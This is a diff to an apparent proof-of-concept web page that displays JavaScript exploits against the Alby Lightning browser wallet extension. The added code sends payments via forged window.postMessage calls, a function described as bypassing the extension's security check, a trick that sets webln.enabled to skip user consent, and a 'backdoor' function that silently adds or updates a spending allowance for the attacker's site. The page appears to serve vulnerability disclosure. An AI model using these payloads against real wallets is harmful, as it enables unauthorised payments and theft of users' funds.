@@ -104,7 +104,27 @@
         </hgroup>
         <div class="button-group">
           <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
+          <pre style="width: 100%;">
+  async function sendUsingWebLnExec() {
+    await window.webln.execute("sendPayment", {
+      paymentRequest: await getInvoice(1000),
+    });
+  }</pre>
           <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
+          <pre style="width: 100%;">
+  async function sendUsingPostMsg170() {
+    window.postMessage(
+      {
+        application: "LBE",
+        prompt: true,
+        type: "sendPayment",
+        args: {
+          paymentRequest: await getInvoice(1000),
+        },
+      },
+      "*"
+    );
+  }</pre>
         </div>
       </section>
       <section class="container">
@@ -116,8 +136,63 @@
         </hgroup>
         <div class="button-group">
           <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
+  <pre style="width: 100%;">
+    async function sendUsingPostMsg180() {
+      window.postMessage(
+        {
+          application: "LBE",
+          prompt: true,
+          action: "sendPayment",
+          type: "sendPaymentOrPrompt",
+          args: {
+            paymentRequest: await getInvoice(1000),
+          },
+        },
+        "*"
+      );
+    }</pre>
           <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+<pre style="width: 100%;">
+  async function bypassEnableSend() {
+    window.webln.enabled = true;
+    await window.webln.sendPayment(await getInvoice(1000));
+  }</pre>
           <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
+<pre style="width: 100%;">
+  async function setupBackdoor() {
+    // Add if non-existent
+    window.postMessage(
+      {
+        application: "LBE",
+        prompt: true,
+        action: "addAllowance",
+        type: "sendPaymentOrPrompt",
+        args: {
+          totalBudget: 100,
+          host: "aarondewes.github.io",
+          name: "Backdoor by Aaron's PoC",
+          imageURL: "https://github.com/getAlby/website/blob/main/public/images/alby_icon_head_icon.png?raw=true",
+          paymentRequest: await getInvoice(1000),
+        },
+      },
+      "*"
+    );
+    // Otherwise update
+    window.postMessage(
+      {
+        application: "LBE",
+        prompt: true,
+        action: "updateAllowance",
+        type: "sendPaymentOrPrompt",
+        args: {
+          totalBudget: 100,
+          enabled: true,
+          paymentRequest: await getInvoice(1000),
+        },
+      },
+      "*"
+    );
+  }</pre>
         </div>
       </section>
     </main>
